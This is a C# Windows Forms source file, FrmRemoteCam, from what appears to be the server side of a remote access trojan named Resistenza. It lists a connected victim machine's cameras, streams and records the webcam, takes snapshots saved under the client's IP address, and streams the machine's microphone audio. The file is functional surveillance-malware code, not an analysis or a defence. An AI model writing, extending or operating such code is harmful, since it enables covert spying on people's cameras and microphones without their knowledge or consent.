
using Resistenza.Server.Networking;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using Resistenza.Common.Packets.Camera;
using Resistenza.Common.Packets.Microphone;
using Resistenza.Common.Tools;
using Resistenza.Common.Packets.Logic;
using System.Net.Sockets;
using System.Diagnostics;
using System.Timers;

using System.Windows.Input;
//using Emgu.CV;
using NAudio;


using Timer = System.Timers.Timer;
using Resistenza.Server.Utilities;
using NAudio.Wave;
using Resistenza.Common.Packets;
using System.Drawing.Text;
//using Emgu.CV.Structure;
//using Emgu.CV.Reg;

using OpenCvSharp.Extensions;
using OpenCvSharp;
using Point = System.Drawing.Point;
using Size = System.Drawing.Size;
using static Resistenza.Server.Networking.ConnectedClient;
using Resistenza.Common.Packets.Remote_Desktop;

namespace Resistenza.Server.Forms
{
    public partial class FrmRemoteCam : Form
    {
        public FrmRemoteCam(ConnectedClient TargetClient)
        {
            InitializeComponent();

            string Loading = "Loading...";
            int In = CamerasBox.Items.Add(Loading);
            CamerasBox.Text = Loading;
            CamerasBox.SelectedIndex = In;

            _Client = TargetClient;
            _Client.IncomingPacket += OnPacketReceived;
            _CurrentlyStreaming = false;
            _IsFirstFrame = true;

            CreatePathForVideoFile();

           

            _waveOut = new WaveOutEvent();
            _BufferedWaveProvider = new BufferedWaveProvider(_Format);
            _waveOut.Init(_BufferedWaveProvider);



            _audioOn = false;
            _recordingOn = false;
            InstructionToEscLabel.Parent = CameraPictureBox;
            _fpsCounterLock = new object();


        }

        private ConnectedClient _Client;
        private bool _CurrentlyStreaming;
        private Timer _FrameRateTimer;
        private bool _IsFirstFrame;
        private int _Fps;
        private int _PreviousSecondFps;
        private bool _ScreenshotPending;

        private VideoWriter _Writer;

        private readonly WaveFormat _Format = new WaveFormat(44100, 16, 2);
        private WaveOutEvent _waveOut;
        private BufferedWaveProvider _BufferedWaveProvider;


        private bool _audioOn;
        private bool _recordingOn;
        private readonly object _fpsCounterLock;

        private double _ImageH;
        private double _ImageW;

        private bool _AskedForStopStreaming;





        private async void OnPacketReceived(object PacketReceived)
        {
            switch (PacketReceived)
            {
                case CamListDevicesResponse:

                    CamListDevicesResponse micListDevicesResponse = (CamListDevicesResponse)PacketReceived;


                    int indexOfLoadingItem = CamerasBox.Items.IndexOf("Loading...");
                    if (indexOfLoadingItem != -1)
                    {
                        CamerasBox.Items.RemoveAt(indexOfLoadingItem);
                    }
                    if (micListDevicesResponse.DevicesNames.Count == 0)
                    {
                        string noCamera = "No Camera Available";
                        int In = CamerasBox.Items.Add(noCamera);
                        CamerasBox.Text = noCamera;
                        CamerasBox.SelectedIndex = In;
                        return;
                    }
                    foreach (var DeviceName in micListDevicesResponse.DevicesNames)
                    {
                        int Index = CamerasBox.Items.Add(DeviceName);
                        if (CamerasBox.Text == string.Empty)
                        {
                            CamerasBox.Text = DeviceName;
                            CamerasBox.SelectedIndex = Index;

                        }
                    }


                    return;
                case CamFrameResponse:

                    if (_ScreenshotPending)
                    {
                        CamFrameResponse screenshotRaw = (CamFrameResponse)PacketReceived;
                        using (MemoryStream ms = new MemoryStream(screenshotRaw.Data))
                        {
                            Image Screen = Image.FromStream(ms);
                            CameraPictureBox.Image = Screen;
                            CameraPictureBox.SizeMode = PictureBoxSizeMode.StretchImage;

                        }

                        EnableOthersControlForScreenshot();




                        _ScreenshotPending = false;
                        ScreenshotProgressLabel.Text = "Done! Double click on the image to zoom.";

                        TakePictureBtn.Visible = false;
                        StartWatchingButton.Visible = false;

                        DownloadScreenshotBtn.Visible = true;
                        DiscardScreenshotBtn.Visible = true;

                        DownloadScreenshotBtn.Location = new Point(150, StartWatchingButton.Location.Y);
                        DiscardScreenshotBtn.Location = new Point(this.Size.Width - (150 + DiscardScreenshotBtn.Size.Width), StartWatchingButton.Location.Y);

                        await Task.Delay(2000); //2 secs
                        ScreenshotProgressLabel.Visible = false;
                    }



                    if (_IsFirstFrame)
                    {
                        _IsFirstFrame = false;
                        _Fps = 0;

                        lock (_fpsCounterLock)
                        {
                            _FrameRateTimer = new Timer(1000);
                            _FrameRateTimer.Elapsed += OnFrameRateTimerElasped;
                            _FrameRateTimer.Start();
                        }

                    }

                    CamFrameResponse camFrame = (CamFrameResponse)PacketReceived;
                    Bitmap Frame = ConvertByteArrayToBitMap(camFrame.Data);


                    CameraPictureBox.Image = Frame;
                    _ImageH = Frame.Height;
                    _ImageW = Frame.Width;


                    _Fps += 1;





                    if (_recordingOn)
                    {
                        Mat imageFrame = BitmapConverter.ToMat(Frame);
                        _Writer.Write(imageFrame);
                    }

                    return;
                case CancelRemoteOperationResponse:

                    if (((CancelRemoteOperationResponse)PacketReceived).TaskId == TasksIds.STREAM_VIDEO_TASK_ID)
                    {
                        CameraPictureBox.Image = null;
                    }


                    return;
                case MicChunkResponse:

                    MicChunkResponse Chunk = (MicChunkResponse)PacketReceived;
                    _BufferedWaveProvider.AddSamples(Chunk.Data, 0, Chunk.Data.Length);
                    return;

                case MicListDevicesResponse:

                    ContextMenuStrip MicSelector = new ContextMenuStrip();
                    ToolStripMenuItem Item = new ToolStripMenuItem();

                    MicSelector.ForeColor = Color.White;
                    MicSelector.BackColor = Color.FromArgb(32, 26, 49);
                    MicSelector.RenderMode = ToolStripRenderMode.System;


                    MicSelector.ItemClicked += MicSelector_ItemClicked;

                    foreach (MicrophoneDeviceInfo Info in ((MicListDevicesResponse)PacketReceived).DevicesNames)
                    {
                        Item = new ToolStripMenuItem(Info.Name);
                        MicSelector.Items.Add(Item);

                    }

                    MicSelector.Items.Add(Item);

                    MicSelector.Show(MousePosition);

                    return;
            }

        }

        protected override async void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);

            // Rimuovi l'handler dell'evento MyEvent


            await _Client.CustomStream.SendPacketAsync(new CancelRemoteOperationRequest() { TaskId = TasksIds.STREAM_VIDEO_TASK_ID });



            _Client.IncomingPacket -= OnPacketReceived; // MyEventHandlerMethod è il metodo che gestisce l'evento


        }

        private async void MicSelector_ItemClicked(object? sender, ToolStripItemClickedEventArgs e)
        {


            TurnOnAudioIcon.Image = Properties.Resources.microphone_sensitivity_high;
            var StartMicStreamingRequest = new MicStartRequest
            {
                ListDevices = false,
                StartTransmit = true,
                NameTargetMic = e.ClickedItem.Text
            };

            await _Client.CustomStream.SendPacketAsync(StartMicStreamingRequest);

            _waveOut.Play();
            _audioOn = true;
        }


        private void OnFrameRateTimerElasped(object sender, ElapsedEventArgs eventArgs)
        {

            lock (_fpsCounterLock)
            {
                _FrameRateTimer.Stop();
                Invoke(() => FrameRateLabel.Text = $"FPS: {_PreviousSecondFps.ToString()}");
                _FrameRateTimer.Dispose();
                _FrameRateTimer = new Timer(1000);
                _FrameRateTimer.Elapsed += OnFrameRateTimerElasped;
                _FrameRateTimer.Start();
                _PreviousSecondFps = _Fps;
                _Fps = 0;
            }



        }



        private Bitmap ConvertByteArrayToBitMap(byte[] Data)
        {
            using (var ms = new MemoryStream(Data))
            {

                return new Bitmap(ms);
            }
        }

       

        private async void StartWatchingButton_Click(object sender, EventArgs e)
        {

            if (!_CurrentlyStreaming && CamerasBox.SelectedItem.ToString() != "No Camera Available")
            {

                StartWatchingButton.Text = "Stop watching";
                StartWatchingButton.Location = new Point(150, StartWatchingButton.Location.Y);

                TakePictureBtn.Visible = false;
                StartRecordingButton.Location = new Point(this.Size.Width - (150 + StartWatchingButton.Size.Width), StartWatchingButton.Location.Y);
                StartRecordingButton.Visible = true;

                string? SelectedCamName = CamerasBox.SelectedItem as string;
                var StartStreamingRequest = new CamStartRequest
                {
                    ListDevices = false,
                    StartTransmit = true,
                    NameTargetCam = SelectedCamName
                };

                await _Client.CustomStream.SendPacketAsync(StartStreamingRequest);
                _CurrentlyStreaming = true;
                _IsFirstFrame = true;
                FrameRateLabel.Visible = true;

                return;



            }
            if (_CurrentlyStreaming)
            {
                StartRecordingButton.Visible = false;
                TakePictureBtn.Visible = true;
                StartWatchingButton.Location = new Point(150, StartWatchingButton.Location.Y);
                StartWatchingButton.Text = "Start watching";

                var StopStreamingRequest = new CancelRemoteOperationRequest()
                {
                    TaskId = TasksIds.STREAM_VIDEO_TASK_ID

                };
                await _Client.CustomStream.SendPacketAsync(StopStreamingRequest);
                _Fps = 0;
                _PreviousSecondFps = 0;

                lock (_fpsCounterLock)
                {
                    _FrameRateTimer.Stop();
                }

                _CurrentlyStreaming = false;
                FrameRateLabel.Visible = false;


            }

        }

        private void CreatePathForVideoFile()
        {
            string Now = DateTime.Now.ToString().Replace(":", ".").Replace("/", "-");
            string Parent = Directory.GetParent(System.Reflection.Assembly.GetEntryAssembly().Location).FullName;

            Directory.CreateDirectory(Path.Join(Parent, "VideoRecordings"));
            RecordingPathTextbox.Text = Path.Join(Parent, "VideoRecordings", $"{Now}.avi");

        }



        private void FrmRemoteCam_KeyDown(object sender, KeyEventArgs e)
        {

        }


        private async void FrmRemoteCam_Load(object sender, EventArgs e)
        {
            var Request = new CamStartRequest()
            {
                ListDevices = true
            };

            await _Client.CustomStream.SendPacketAsync(Request);


            StartWatchingButton.Location = new Point(150, StartWatchingButton.Location.Y);
            TakePictureBtn.Location = new Point(this.Size.Width - (150 + TakePictureBtn.Size.Width), StartWatchingButton.Location.Y);
            CameraPictureBox.Location = new Point((this.Size.Width / 2) - (CameraPictureBox.Size.Width / 2), CameraPictureBox.Location.Y);

        }

        private async void StartRecordingButton_Click(object sender, EventArgs e)
        {
            if (StartRecordingButton.Text == "Start Recording")
            {
                try
                {

                    _Writer = new VideoWriter(RecordingPathTextbox.Text, FourCC.FromString("MJPG"), 30, new OpenCvSharp.Size(_ImageW, _ImageH));
                    _recordingOn = true;
                }
                catch (Exception ex)
                {

                    await MessageBoxAsync.MessageBoxErrorAsync("Error", ex.Message);
                }
                StartRecordingButton.Text = "Stop Recording";
            }
            else
            {
                CreatePathForVideoFile();
                StartRecordingButton.Text = "Start Recording";

                _Writer.Dispose();
                _recordingOn = false;


            }



        }

        private async void TurnOnAudioIcon_Click(object sender, EventArgs e)
        {
            if (StartWatchingButton.Text == "Start Watching")
            {
                return;
            }

            if (_audioOn == false)
            {

                var AvailableMicRequest = new MicStartRequest
                {
                    ListDevices = true,
                    StartTransmit = false
                };

                await _Client.CustomStream.SendPacketAsync(AvailableMicRequest);


            }
            else
            {
                _audioOn = false;
                TurnOnAudioIcon.Image = Properties.Resources.microphone_sensitivity_muted;

                var StopStreamingRequest = new CancelRemoteOperationRequest()
                {
                    TaskId = TasksIds.STREAM_AUDIO_TASK_ID
                };

                await _Client.CustomStream.SendPacketAsync(StopStreamingRequest);
                _waveOut.Stop();
            }
        }

        private void CameraPictureBox_Click(object sender, EventArgs e)
        {

        }


        private void CamerasBox_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private async void TakePictureBtn_Click(object sender, EventArgs e)
        {
            _ScreenshotPending = true;
            ScreenshotProgressLabel.Visible = true;
            ScreenshotProgressLabel.Text = "Carrying command out...";
            await _Client.CustomStream.SendPacketAsync(new CamScreenshotRequest()
            {
                NameTargetCam = CamerasBox.SelectedItem as string
            });
            ScreenshotProgressLabel.Text = "Waiting for the response...";
            DisableOthersControlForScreenshot();


        }

        private void ResetBtn()
        {
            DiscardScreenshotBtn.Visible = false;
            DownloadScreenshotBtn.Visible = false;
            StartWatchingButton.Visible = true;
            TakePictureBtn.Visible = true;

            StartWatchingButton.Location = new Point(150, StartWatchingButton.Location.Y);
            TakePictureBtn.Location = new Point(this.Size.Width - (150 + TakePictureBtn.Size.Width), StartWatchingButton.Location.Y);

            CameraPictureBox.Image = null;
        }

        private void DiscardScreenshotBtn_Click(object sender, EventArgs e)
        {
            ResetBtn();
        }

        private void DisableOthersControlForScreenshot()
        {
            TakePictureBtn.Enabled = false;
            StartWatchingButton.Enabled = false;
        }
        private void EnableOthersControlForScreenshot()
        {
            TakePictureBtn.Enabled = true;
            StartWatchingButton.Enabled = true;
        }

        private void DownloadScreenshotBtn_Click(object sender, EventArgs e)
        {
            SaveFileDialog s = new SaveFileDialog();
            s.FileName = _Client.IpAddress.Length < 15 ? $"{_Client.IpAddress}_camera" : "camera_snapshot"; //ipv6 has invalid characters for windows paths
            s.DefaultExt = ".png";
            s.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            // s.Filter = "Picture (*.jpeg)|*.jpeg";

            DisableOthersControlForScreenshot();

            if (s.ShowDialog() == DialogResult.OK)
            {
                // Save Image
                string filename = s.FileName;
                Image image = CameraPictureBox.Image;

                ScreenshotProgressLabel.Visible = true;
                ScreenshotProgressLabel.Text = $"Saving picture.. Be patient! <3";

                image.Save(filename);

                ScreenshotProgressLabel.Text = $"Done!";
                ScreenshotProgressLabel.Visible = false;


                ResetBtn();


            }

            EnableOthersControlForScreenshot();
        }

        private async void CameraPictureBox_DoubleClick(object sender, EventArgs e)
        {
            if (CameraPictureBox.Image != null && CameraPictureBox.Dock == DockStyle.None)
            {
                CameraPictureBox.Dock = DockStyle.Fill;
                CameraPictureBox.BringToFront();

                InstructionToEscLabel.Location = new Point((this.Size.Width / 2) - (InstructionToEscLabel.Size.Width / 2), InstructionToEscLabel.Location.Y);
                InstructionToEscLabel.Visible = true;
                await Task.Delay(1500);
                InstructionToEscLabel.Visible = false;
            }

            else
            {
                CameraPictureBox.Dock = DockStyle.None;

            }
        }

        private async void FrmRemoteCam_FormClosing(object sender, FormClosingEventArgs e)
        {
            //vibase.OnFormClosing(e);
            await _Client.CustomStream.SendPacketAsync(new CancelRemoteOperationRequest() { TaskId = TasksIds.STREAM_VIDEO_TASK_ID });
            _Client.IncomingPacket -= OnPacketReceived; // MyEventHandlerMethod è il metodo che gestisce l'evento
        }
    }
}
